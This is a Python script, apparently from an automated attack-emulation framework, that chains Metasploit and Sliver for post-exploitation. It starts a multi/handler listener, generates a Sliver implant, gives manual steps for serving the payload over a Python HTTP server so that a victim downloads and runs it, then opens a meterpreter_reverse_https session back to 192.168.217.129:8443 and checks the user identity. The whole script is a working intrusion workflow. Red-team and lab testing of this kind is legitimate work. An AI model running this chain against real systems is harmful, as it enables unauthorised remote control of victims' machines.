
import asyncio
from test.executor_Beautify import (
    executor_manual_hint,
    executor_sliver_implant_generation,
    console,
    load_config,
    print_welcome_message,
    confirm_action,
    print_status_message
)
async def main():
    print_welcome_message()
    from attack_executor.config import load_config
    config = load_config(config_file_path="/home/kali/Desktop/xiangmu/attack_executor-main/test/config.ini")
    from attack_executor.exploit.Metasploit import MetasploitExecutor
    with console.status("[bold green]Configuring Metasploit payload..."):
        metasploit_executor = MetasploitExecutor(config=config)

        metasploit_executor.exploit_and_execute_payload(   
            exploit_module_name="multi/handler",
            payload_module_name="",
            RPORT="",
            LHOST="",
            LPORT="",
        )

    metasploit_sessionid = metasploit_executor.select_session()

    from attack_executor.post_exploit.Sliver import SliverExecutor
    sliver_executor = SliverExecutor(config=config)

    await executor_sliver_implant_generation()
    console.print("""\
        [bold green][MANUAL ACTION REQUIRED][/bold green]
        (This step needs human interaction and (temporarily) cannot be executed automatically)
        (On attacker's machine)
        python -m http.server

        (On victim's machine)
        1. Open #{LHOST}:#{LPORT} in the browser
        2. Navigate to the path of the target payload file
        3. Download the payload file
        4. Execute the payload file to #{PATH}
        """)
    confirm_action("Confirm execution of the next step?")

    # Unknown executor: None
    # Command: None

    sliver_sessionid = await sliver_executor.select_sessions()

    confirm_action("Confirm execution of the next step?")
    await sliver_executor.msf(sliver_sessionid, "meterpreter_reverse_https", "192.168.217.129", 8443)
    print_status_message("Command execution completed!", status="success")

    confirm_action("Confirm execution of the next step?")

    metasploit_sessionid = metasploit_executor.select_meterpreter_session()

    metasploit_executor.getuid(metasploit_sessionid)
    print_status_message("Command execution completed!", status="success")

if __name__ == "__main__":
    asyncio.run(main())
